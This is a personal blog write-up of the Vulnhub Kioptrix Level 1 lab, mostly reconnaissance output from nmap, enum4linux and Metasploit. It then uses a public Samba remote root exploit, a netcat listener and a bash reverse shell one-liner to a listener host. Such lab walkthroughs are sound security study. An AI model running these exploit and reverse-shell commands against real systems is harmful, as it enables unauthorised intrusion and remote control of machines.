---
layout: post
title: Vulnhub Kioptrix
---

Did this vm to get the hang of setting up VMWare Workstation and plan to revisit this vm at a later point.

https://www.vulnhub.com/entry/kioptrix-level-1-1,22/

Starting off with a nmap scan.
```
nmap -sV -sC -oA nmap 192.168.0.14

less nmap.nmap

Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-01 00:54 EDT
Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.39% done; ETC: 00:55 (0:00:00 remaining)
Stats: 0:04:28 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.88% done; ETC: 00:59 (0:00:00 remaining)
Nmap scan report for 192.168.0.14
Host is up (0.0016s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1           1024/tcp  status
|_  100024  1           1024/udp  status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: 400 Bad Request
|_ssl-date: 2019-09-01T04:56:52+00:00; +1m50s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
1024/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:7C:3A:16 (VMware)

Host script results:
|_clock-skew: mean: 1m49s, deviation: 0s, median: 1m49s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 278.74 seconds
```
We see a website on port 80 so we run a gobuster scan in the background and go do other things while that is running.
```
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://192.168.0.14:80/ -x php -t 100 -e
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.0.14:80/
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2019/09/01 01:20:20 Starting gobuster
===============================================================
http://192.168.0.14:80/test.php (Status: 200)
http://192.168.0.14:80/manual (Status: 301)
http://192.168.0.14:80/usage (Status: 301)
http://192.168.0.14:80/mrtg (Status: 301)
===============================================================
2019/09/01 01:21:11 Finished
===============================================================
```
Nothing interesting on the pages we got.
```
nbtscan 192.168.0.14
Doing NBT name scan for addresses from 192.168.0.14

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
192.168.0.14     KIOPTRIX         <server>  KIOPTRIX         00:00:00:00:00:00
```
```
rpcclient -U "" 192.168.0.14

rpcclient $> srvinfo
	KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
	platform_id     :	500
	os version      :	4.5
	server type     :	0x9a03
rpcclient $> 

rpcclient $> enumdomusers
rpcclient $> getdompwinfo
min_password_length: 0
password_properties: 0x00000000
```
Let’s try work out what Samba version we have.
```
enum4linux 192.168.0.14
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Sep  1 05:39:50 2019

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.0.14
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 192.168.0.14    |
 ==================================================== 
[+] Got domain/workgroup name: MYGROUP

 ============================================ 
|    Nbtstat Information for 192.168.0.14    |
 ============================================ 
Looking up status of 192.168.0.14
	KIOPTRIX        <00> -         B <ACTIVE>  Workstation Service
	KIOPTRIX        <03> -         B <ACTIVE>  Messenger Service
	KIOPTRIX        <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	MYGROUP         <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	MYGROUP         <1d> -         B <ACTIVE>  Master Browser
	MYGROUP         <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on 192.168.0.14    |
 ===================================== 
[+] Server 192.168.0.14 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 192.168.0.14    |
 =========================================== 
Domain Name: MYGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 192.168.0.14    |
 ====================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.168.0.14 from smbclient: 
[+] Got OS info for 192.168.0.14 from srvinfo:
	KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
	platform_id     :	500
	os version      :	4.5
	server type     :	0x9a03

 ============================= 
|    Users on 192.168.0.14    |
 ============================= 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ========================================= 
|    Share Enumeration on 192.168.0.14    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
	IPC$            IPC       IPC Service (Samba Server)
	ADMIN$          IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------
	KIOPTRIX             Samba Server

	Workgroup            Master
	---------            -------
	MYGROUP              KIOPTRIX

[+] Attempting to map shares on 192.168.0.14
//192.168.0.14/IPC$	[E] Can't understand response:
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
//192.168.0.14/ADMIN$	[E] Can't understand response:
tree connect failed: NT_STATUS_WRONG_PASSWORD

 ==================================================== 
|    Password Policy Information for 192.168.0.14    |
 ==================================================== 
[E] Unexpected error from polenum:


[+] Attaching to 192.168.0.14 using a NULL share

[+] Trying protocol 445/SMB...

	[!] Protocol failed: [Errno Connection error (192.168.0.14:445)] [Errno 111] Connection refused

[+] Trying protocol 139/SMB...

	[!] Protocol failed: SMB SessionError: 0x5


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 0


 ============================== 
|    Groups on 192.168.0.14    |
 ============================== 

[+] Getting builtin groups:
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Power Users] rid:[0x223]
group:[Account Operators] rid:[0x224]
group:[System Operators] rid:[0x225]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]

[+] Getting builtin group memberships:
Group 'System Operators' (RID: 549) has member: Couldn't find group System Operators
Group 'Account Operators' (RID: 548) has member: Couldn't find group Account Operators
Group 'Users' (RID: 545) has member: Couldn't find group Users
Group 'Backup Operators' (RID: 551) has member: Couldn't find group Backup Operators
Group 'Print Operators' (RID: 550) has member: Couldn't find group Print Operators
Group 'Power Users' (RID: 547) has member: Couldn't find group Power Users
Group 'Replicator' (RID: 552) has member: Couldn't find group Replicator
Group 'Administrators' (RID: 544) has member: Couldn't find group Administrators
Group 'Guests' (RID: 546) has member: Couldn't find group Guests

[+] Getting local groups:
group:[sys] rid:[0x3ef]
group:[tty] rid:[0x3f3]
group:[disk] rid:[0x3f5]
group:[mem] rid:[0x3f9]
group:[kmem] rid:[0x3fb]
group:[wheel] rid:[0x3fd]
group:[man] rid:[0x407]
group:[dip] rid:[0x439]
group:[lock] rid:[0x455]
group:[users] rid:[0x4b1]
group:[slocate] rid:[0x413]
group:[floppy] rid:[0x40f]
group:[utmp] rid:[0x415]

[+] Getting local group memberships:

[+] Getting domain groups:
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]

[+] Getting domain group memberships:
Group 'Domain Admins' (RID: 512) has member: Couldn't find group Domain Admins
Group 'Domain Users' (RID: 513) has member: Couldn't find group Domain Users

 ======================================================================= 
|    Users on 192.168.0.14 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-5-21-4157223341-3243572438-1405127623
[+] Enumerating users using SID S-1-5-21-4157223341-3243572438-1405127623 and logon username '', password ''
S-1-5-21-4157223341-3243572438-1405127623-500 KIOPTRIX\
                                                        (0)
S-1-5-21-4157223341-3243572438-1405127623-501 KIOPTRIX\ (0)
S-1-5-21-4157223341-3243572438-1405127623-502 KIOPTRIX\unix_group.2147483399 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-503 KIOPTRIX\unix_group.2147483399 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-504 KIOPTRIX\unix_group.2147483400 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-505 KIOPTRIX\unix_group.2147483400 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-506 KIOPTRIX\unix_group.2147483401 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-507 KIOPTRIX\unix_group.2147483401 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-508 KIOPTRIX\unix_group.2147483402 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-509 KIOPTRIX\unix_group.2147483402 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-510 KIOPTRIX\unix_group.2147483403 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-511 KIOPTRIX\unix_group.2147483403 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-512 KIOPTRIX\Domain Admins (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-513 KIOPTRIX\Domain Users (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-514 KIOPTRIX\Domain Guests (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-515 KIOPTRIX\unix_group.2147483405 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-516 KIOPTRIX\unix_group.2147483406 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-517 KIOPTRIX\unix_group.2147483406 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-518 KIOPTRIX\unix_group.2147483407 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-519 KIOPTRIX\unix_group.2147483407 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-520 KIOPTRIX\unix_group.2147483408 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-521 KIOPTRIX\unix_group.2147483408 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-522 KIOPTRIX\unix_group.2147483409 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-523 KIOPTRIX\unix_group.2147483409 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-524 KIOPTRIX\unix_group.2147483410 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-525 KIOPTRIX\unix_group.2147483410 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-526 KIOPTRIX\unix_group.2147483411 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-527 KIOPTRIX\unix_group.2147483411 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-528 KIOPTRIX\unix_group.2147483412 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-529 KIOPTRIX\unix_group.2147483412 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-530 KIOPTRIX\unix_group.2147483413 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-531 KIOPTRIX\unix_group.2147483413 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-532 KIOPTRIX\unix_group.2147483414 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-533 KIOPTRIX\unix_group.2147483414 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-534 KIOPTRIX\unix_group.2147483415 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-535 KIOPTRIX\unix_group.2147483415 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-536 KIOPTRIX\unix_group.2147483416 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-537 KIOPTRIX\unix_group.2147483416 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-538 KIOPTRIX\unix_group.2147483417 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-539 KIOPTRIX\unix_group.2147483417 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-540 KIOPTRIX\unix_group.2147483418 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-541 KIOPTRIX\unix_group.2147483418 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-542 KIOPTRIX\unix_group.2147483419 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-543 KIOPTRIX\unix_group.2147483419 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-544 KIOPTRIX\unix_group.2147483420 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-545 KIOPTRIX\unix_group.2147483420 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-546 KIOPTRIX\unix_group.2147483421 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-547 KIOPTRIX\unix_group.2147483421 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-548 KIOPTRIX\unix_group.2147483422 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-549 KIOPTRIX\unix_group.2147483422 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-550 KIOPTRIX\unix_group.2147483423 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1000 KIOPTRIX\root (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1001 KIOPTRIX\root (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1002 KIOPTRIX\bin (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1003 KIOPTRIX\bin (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1004 KIOPTRIX\daemon (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1005 KIOPTRIX\daemon (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1006 KIOPTRIX\adm (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1007 KIOPTRIX\sys (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1008 KIOPTRIX\lp (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1009 KIOPTRIX\adm (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1010 KIOPTRIX\sync (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1011 KIOPTRIX\tty (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1012 KIOPTRIX\shutdown (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1013 KIOPTRIX\disk (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1014 KIOPTRIX\halt (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1015 KIOPTRIX\lp (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1016 KIOPTRIX\mail (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1017 KIOPTRIX\mem (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1018 KIOPTRIX\news (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1019 KIOPTRIX\kmem (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1020 KIOPTRIX\uucp (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1021 KIOPTRIX\wheel (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1022 KIOPTRIX\operator (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1023 KIOPTRIX\unix_group.11 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1024 KIOPTRIX\games (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1025 KIOPTRIX\mail (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1026 KIOPTRIX\gopher (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1027 KIOPTRIX\news (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1028 KIOPTRIX\ftp (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1029 KIOPTRIX\uucp (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1030 KIOPTRIX\unix_user.15 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1031 KIOPTRIX\man (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1032 KIOPTRIX\unix_user.16 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1033 KIOPTRIX\unix_group.16 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1034 KIOPTRIX\unix_user.17 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1035 KIOPTRIX\unix_group.17 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1036 KIOPTRIX\unix_user.18 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1037 KIOPTRIX\unix_group.18 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1038 KIOPTRIX\unix_user.19 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1039 KIOPTRIX\floppy (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1040 KIOPTRIX\unix_user.20 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1041 KIOPTRIX\games (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1042 KIOPTRIX\unix_user.21 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1043 KIOPTRIX\slocate (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1044 KIOPTRIX\unix_user.22 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1045 KIOPTRIX\utmp (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1046 KIOPTRIX\squid (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1047 KIOPTRIX\squid (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1048 KIOPTRIX\unix_user.24 (Local User)
S-1-5-21-4157223341-3243572438-1405127623-1049 KIOPTRIX\unix_group.24 (Local Group)
S-1-5-21-4157223341-3243572438-1405127623-1050 KIOPTRIX\unix_user.25 (Local User)

 ============================================= 
|    Getting printer info for 192.168.0.14    |
 ============================================= 
No printers returned.
```

enum4linux complete on Sun Sep  1 05:39:59 2019

OS Info should give us the server name type of Samba 2.2.1a but there is a but in the enum4linux which has been there for awhile with no fix.

# EDIT: Found a fix for enum4linux https://github.com/BrashEndeavours/hotwax 

I found a way around this later on by using msfconsole.
```
msfconsole

use auxiliary/scanner/smb/smb_version 

set RHOSTS 192.168.0.14

run

[*] 192.168.0.14:139      - Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.0.14:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

searchsploit 2.2.1a
Exploits: No Result
Shellcodes: No Result

searchsploit samba 2.2
------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                                                          |  Path
                                                                                                                        | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Samba 2.0.x/2.2 - Arbitrary File Creation                                                                               | exploits/unix/remote/20968.txt
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                            | exploits/osx/remote/9924.rb
Samba 2.2.2 < 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1)                                                 | exploits/linux/remote/16321.rb
Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploit)                                                       | exploits/bsd_x86/remote/16880.rb
Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation                                         | exploits/linux/local/23674.txt
Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)                                                     | exploits/linux_x86/remote/16861.rb
Samba 2.2.8 (OSX/PPC) - 'trans2open' Remote Overflow (Metasploit)                                                       | exploits/osx_ppc/remote/16876.rb
Samba 2.2.8 (Solaris SPARC) - 'trans2open' Remote Overflow (Metasploit)                                                 | exploits/solaris_sparc/remote/16330.rb
Samba 2.2.8 - Brute Force Method Remote Command Execution                                                               | exploits/linux/remote/55.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                              | exploits/unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                              | exploits/unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                              | exploits/unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                              | exploits/unix/remote/22471.txt
Samba 2.2.x - 'nttrans' Remote Overflow (Metasploit)                                                                    | exploits/linux/remote/9936.rb
Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                                 | exploits/unix/remote/22356.c
Samba 2.2.x - Remote Buffer Overflow                                                                                    | exploits/linux/remote/7.pl
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                       | exploits/multiple/remote/10.c
------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
```
 I chose to use this one 
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution                                                                     | exploits/multiple/remote/10.c


https://www.exploit-db.com/exploits/10

This is a remote root exploit for Samba 2.2.x
```
gcc samba-exploit.c -o exploit

./exploit -b 0 192.168.0.14
```
In another console we set up a listener.
```
nc -nlvp 4444
```
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
on the exploit console 
```
bash -i >& /dev/tcp/192.168.0.16/4444 0>&1
```
Now we have root access to the box.

Tools used

nmap
gobuster
nbtscan
rpcclient
enum4linux
gcc
nc (netcat)
metasploit
VMware Workstation

This was a pretty easy box once I got the handle of the different tools. Setting up VMware so I could connect two boxes together was a bit annoying but I worked it out in the end. It’s disappointing that enum4linux is still broken after so many years but luckily was able to use metasploit to get the information about the box, but still need to find a better way since you can use auxiliary on only 1 box for oscp.

EDIT: Manage to find fix for enum4linux see above.

I plan to revisit this to do more privlage escalation.

Sources used for help

https://blog.bladeism.com/kioptrix-level-1/
https://n0tty.github.io/2017/02/25/kioptrix-1/
